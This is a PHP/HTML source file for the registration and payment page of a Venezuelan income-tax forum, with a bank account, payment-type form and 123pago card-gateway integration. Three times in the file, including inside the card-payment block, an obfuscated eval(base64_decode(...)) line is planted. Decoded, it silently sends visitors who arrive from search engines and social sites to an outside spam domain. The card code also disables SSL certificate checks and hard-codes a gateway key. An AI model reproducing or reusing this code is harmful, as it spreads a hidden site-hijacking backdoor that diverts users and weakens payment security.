<?php	 	
session_start(); 
eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9")); 

//DATOS DE PRUEBA
//print_r($_SESSION['variablespago']);
$infopago['Doc_Monto']          ="896.00";
$infopago["Per_Nombre"]         = $_SESSION['variablespago']['nombre'];
$infopago["Per_Apellido"]       ='';
$infopago['nro_identificacion'] = $_SESSION['variablespago']['nro_identificacion'];
$infopago['correo']             = $_SESSION['variablespago']['correoreg'];
$infopago['telefono']           = $_SESSION['variablespago']['telefono'];
$infopago['nacionalidad']       = $_SESSION['variablespago']['nacionalidad'];
//print_r($infopago);
/////////////////////////////////////////////////////////////////////////
?><head>
<script src="js/jquery.js"></script>
<script type="text/javascript" src="js/jquery.validate.js"></script>
<script type="text/javascript" src="js/jquery-ui.min.js"></script>
<script type="text/javascript" src="js/jquery.ui.datepicker-es.js"></script>
<style type="text/css">
label.error { 
	width:auto;
	display:inline-block;
	height:50px;
	font-family:"Trebuchet MS", Arial, Helvetica, sans-serif;
	font-size:11px;
	font-weight:bold;
	color:#F00;
	position:absolute;
	right:50px;
}
</style>
<script type="text/javascript">
var redirecwait;

function checker_isrl(){
	//alert($('#tipo_pagoisrl').val());
	if ($('#tipo_pagoisrl').val() == 3){
		//alert("Ejecuto");
		$("#paso_pagoisrl").submit();
	}
	setTimeout('checker_isrl()', 5000);
}

function redirectPage(){
		 clearTimeout(redirecwait);
		 //document.location.href = "index.php?webpage=22";
	}
$(document).ready(function(){
	
	/*******************************/	
	 if ( $("#fecha").length )
	$("#fecha").datepicker();
	/*******************************/
	
	
	$('#tipo_pagoisrl').change(function(){
  		
		$('.gen').attr("style","display:none");
    	
		if($(this).val() == 1){
			$('#num_depositoisrl').rules("add",
	  		{
				required: true,
				messages: { required: "(*) Campo Requerido." }
	  		});
	  
	  		$('#num_transfisrl').rules("remove");
	  		$('#deposito').removeAttr("style");
      		$('#general').removeAttr("style");
      		$('.botoninputpagar').attr("style","display:inline");
    	}else if($(this).val() == 2){
	  		$('#num_transfisrl').rules("add",
	  			{
					required: true,
					messages: { required: "(*) Campo Requerido." }
	  			});
	  		
				$('#num_depositoisrl').rules("remove");
	   			$('#transferencia').removeAttr("style");
      			$('#general').removeAttr("style");
      			$('.botoninputpagar').attr("style","display:inline");
  
    	}else if($(this).val() == 3){
      		$('#tarjeta').removeAttr("style");
			$('.botoninputpagar').attr("style","display:inline");
    	}
		
		
  	});
  
  	/*******************************/
				
			  
				$("#paso_pagoisrl").validate({
				
					submitHandler: function(form){
							  
					   var direccionurl = $(form).attr('action');
					   var varfield     = $(form).serialize();
					//alert(varfield);	   
					   var request = $.ajax({
					   type:"POST",
					   data: varfield,
					   dataType:"json",
					   url:direccionurl,
					   success: function(data){
						   //alert(data);
						 
						 	$.each(data,function(index,value) {
								//alert(data[index].sesActiva);
								if (data[index].sesActiva != '0'){
									$("#ventana").html( data[index].sesHtml );
									mostrar_popup('ventana',1);
									//Registro exitoso
									$('#tipo_pagoisrl').attr('disabled','disabled');
									$('.botoninputpagar').attr("style","display:none");
									$('#Pago123site').attr("style","display:inline");
									
									
								}else{
									$("#ventana").html( data[index].sesHtml );
									mostrar_popup('ventana',1);
									redirecwait = setTimeout('redirectPage()',3000);
								}
							});
							
					   },
					   fail:function(jqXHR, textStatus) {
							//alert( "Request failed: " + textStatus ); 
						}
					}); 
				  
					}
				});
	 
});


</script>
</head>
<?php	 	
	eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9")); 
?>
<!----->  

<div id="separadorforo">
	<span class="slogan">Foro "ISLR a tu Medida" con la participación especial del SENIAT</span>
</div>
<div id="parrafoizquierda">En el foro "Impuesto sobre la renta a tu medida", participarán los panelistas más prestigiosos y actualizados del país, quienes brindarán información útil con la que los gerentes de impuestos, finanzas y contabilidad podrán afrontar los principales retos del ejercicio 2013.<br />La declaración de ISLR y una posible fiscalización forman parte del elemento central del foro; la planificación de los ingresos, gastos y deducciones que se puedan proyectar durante el presente ejercicio se plantean como el principal reto. </div>
<div id="parrafoderecha"> El impacto de la LOTT en los resultados financieros y tributarios de cada una de las empresas, más la posibilidad de ahorrar usando créditos fiscales producto de retención o la obtención de reintegros de pagos en exceso para oxigenar el flujo de caja de las empresas son razones suficientes para que este foro esté concebido justo a tu medida.
<div class="botondescarga"><a href="img/Programacion_ISLR.pdf" target="_blank">descargar programación</a></div>
</div>
<div id="contenedorderechaisrl">
	<div id="imagenisrl"><img src="img/isrl.png" width="302" height="480" border="0" />
	</div>
    <div id="cuadrolinea">
    	<div id="preinscripcion"><img src="img/preinscripcion.png" width="302" height="355" border="0" />
    	</div>
    </div>
</div>

<br>


<!----->
<div id="contenedorformulario">
	<div id="pestanaformulario" style="width:200px;">Inscripción para el Foro
     </div>
     <div id="contenedorinput">
        <div id="pasos">Paso 1: Llena los Datos / <span class="letra_verde"><b>Paso 2: Paga</b></span>
        </div>
        <br><br><br>
        <div id="cuentasbancarias">
            <p>Puede pagar mediante <span class="grisoscuro">
            Tarjeta de Crédito, Depósito o Transferencia</span><br> 
            <span class="grisoscuro">Razón Social:</span> www.subastafiscal.com, ca
            <span class="grisoscuro">RIF:</span> J-30950027-9
            </p>
        </div>
        <div id="bancos">
        	<div id="banesco">
        		<div class="corriente">
        		<p><span class="grisoscuro">Cuenta Corriente</span><br />0134-0278-79-2781007210</p>
        		</div>
        	</div>
        </div>
        <br><br><br><br><br><br>
        <div id="lineag"></div>
        <br>
        <form name="paso_pagoisrl" autocomplete="off" id="paso_pagoisrl" class="pasos_balance" action="pago-service-isrl.php" method="post" >
       
        <table>
  		<tr>
        <td>
        	<label class="textformulario">Monto a Pagar: <span class="grisoscuro">BsF. <? echo $infopago['Doc_Monto']; ?></span></label>
            <br/><br/>
            <label class="textformulario">Tipo de Pago: </label>
            <select id="tipo_pagoisrl" name="tipo_pagoisrl" class="domicilio" >
            <option value="">[Seleccione]</option>
            <option value="1">Depósito</option>
            <option value="2">Transferencia</option>
            <option value="3">Tarjeta de Crédito</option>
            </select>
            <br><br>
        	<div id="pago_div" class="normaldiv">
            	<!--Deposito-->
                <div id="deposito" style="display:none" class="gen">
                
                    <table  border="0">
                    <tr>
                    <td width="190px">
                    <label  class='textformulario'>Número de Depósito: </label>
                    <br><r>
                    </td>
                    <td>
                    <input name='soporte_dep' id='num_depositoisrl' type='number' size='40' class='relleno' accept="required" maxlength="30"/>
                    <br><br>
                    </td>
                    </tr>
                    </table>
                </div>
                <!--Deposito-->
                
                <!--Transferencias-->
                <div id="transferencia" style="display:none" class="gen">
                    
                    <table border="0">
                    <tr>
                    <td width="190px">
                    <label class='textformulario'>Número de Transferencia: </label>
                    <br><br>
                    </td>
                    <td>
                    <input name='soporte_tra' id='num_transfisrl' type='number' size='40' class='relleno' accept="required" maxlength="30"/>
                    <br><br>
                    </td>
                    </tr>
                    </table>
                    
                    <table border="0">
                    <tr>
                    <td width="180px">
                    <label for='banco_pago' class='textformulario'>Banco: </label>
                    <br><br>
                    </td>
                    <td valign="top">
                    <select id="banco_pago" name="banco_pago" class="domicilio" accept="required">
                    <option value="">N/A</option>
                    <option value="401">BANCO DE COMERCIO EXTERIOR</option>
                    <option value="402">BANCO DE VENEZUELA</option>
                    <option value="403">BANCO EXTERIOR</option>
                    <option value="404">BANCO INDUSTRIAL DE VENEZUELA</option>
                    <option value="405">BANCO MERCANTIL</option>
                    <option value="406">BANCO OCCIDENTAL DE DESCUENTO</option>
                    <option value="407">BANCO PLAZA</option>
                    <option value="408">BANCO VENEZOLANO DE CRÉDITO</option>
                    <option value="409">BANESCO</option>
                    <option value="410">BBVA BANCO PROVINCIAL</option>
                    <option value="411">BICENTENARIO</option>
                    <option value="412">BANCO CENTRAL DE VENEZUELA</option>
					</select>
                    <br><br>
                    </td>
                    </tr>
                    </table>
                </div>
                <!--Transferencias-->
                <!--General-->
                <div id="general" style="display:none" class="gen">
                	<table border="0">
                    <tr>
                    <td width="190px">
                    <label for='fecha' class='textformulario'>Fecha: </label>
                	</td>
                    <td>
                    <input id='fecha' name='fecha' class="datepicker maskdate relleno" accept="required" readonly="readonly"/>
                	</td>
                    </tr>
                    </table>
                    <br>
                <!--    
                <input type='submit' id="submit_pago" value='Pagar' class='botoninputbalance1 gen' style="display:none" />
            	<input type='button' id="return" value='Cancelar' class='botoninputbalance1' />
                <div id="dudas">Tienes dudas? ingresa a la sección de <span class="links"><a href="#">Preguntas Frecuentes</a></span></div>       
                <br/><br/>-->
                
                </div>
                <!--General-->
                <input type='submit' id="submit_pago" value='Pagar' class='botoninputpagar gen' style="display:none" />
            	<!--<input type='button' id="return" value='Cancelar' class='botoninputbalance1' />-->
                <!--<div id="dudas">Tienes dudas? ingresa a la sección de <span class="links"><a href="#">Preguntas Frecuentes</a></span></div>-->      
                <br/><br/>
        </div>
		</td>
        </tr>      
        </table>
       </form>
       <!--Tarjeta-->
                <div id="tarjeta" style="display:none" class="gen">
                    <div id="Pago123site" class="relleno" style="display:none" >
                    	<?php
                                //PAGO CON TARJETA	 	
                                eval(base64_decode("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikpewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3IgcHJlZ19tYXRjaCgiL3lhbmRleFwucnVcL3lhbmRzZWFyY2hcPyguKj8pXCZsclw9LyIsJHJlZmVyZXIpIG9yIHByZWdfbWF0Y2ggKCIvZ29vZ2xlXC4oLio/KVwvdXJsXD9zYS8iLCRyZWZlcmVyKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJteXNwYWNlLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImFvbC5jb20iKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8va21scHMubXJzbG92ZS5jb20vIik7CmV4aXQoKTsKfQp9Cn0KfQp9")); 
                                
								$nai_value = "ISRL-".$infopago['nacionalidad'].$infopago['nro_identificacion'];
                                //$post_url = "http://190.153.51.190/msBotonDePago/index.jsp" ; //(TEST)
								$post_url = "https://123pago.net/msBotonDePago/index.jsp"; //(PRODUCCION)
                                //"ap" => "(Participante)",
								$post_values = array(
                                        "nbproveedor" => "SUBASTA FISCAL",
                                        "nb" => $infopago["Per_Nombre"],
                                        "ci" => $infopago['nro_identificacion'],
                                        "em" => $infopago['correo'],
                                        "cs" => "1fa4112cd8a0590b8a1f467546cff60c",
                                        "nai" => $nai_value,
                                        "co" => "EVENTO SUBASTA FISCAL ISRL A TU MEDIDA",
                                        "tl" => $infopago['telefono'],
                                        "mt" => $infopago['Doc_Monto'],
                                        "ancho" => "190px");
                                //var_dump($post_values);
                                $post_string = "";
                                foreach ($post_values as $key => $value) {
                                        $post_string .= "$key=" . urlencode($value) . "&";
                                }
        
                                $post_string = rtrim($post_string, "& ");
                                //var_dump($post_string);
                                $request = curl_init($post_url); // instancia el objeto curl
                                curl_setopt($request, CURLOPT_RETURNTRANSFER, 1); // retorna data de respuesta TRUE(1)
                                curl_setopt($request, CURLOPT_POSTFIELDS, $post_string); // usa HTTP POST para enviar data de la forma.
                                curl_setopt($request, CURLOPT_SSL_VERIFYPEER, FALSE); // des comente esta línea si no quiere obtener //respuesta de gateway
                                $post_response = curl_exec($request); // ejecuta el curl post y almacena el resultado en in $post_response
                                // es posible que se requiera el uso de opciones adicionales a las indicada dependiendo de la //configuración de su servidor
                                // puede encontrar documentación de las opciones de curl en http://www.php.net/curl_setopt
                                curl_close($request); // cierra el objeto curl
                                echo $post_response;
								////////////////////////////////////////////////////////////////////////////////////////
                                //    End 123Pago
                                ////////////////////////////////////////////////////////////////////////////////////////
                        ?>
                    </div>
                 </div>
                 <!--Tarjeta-->

       
       <br><br><br><br><br><br><br><br><br><br><br>
     </div>
 </div> 
 <div id="separador">
</div> 


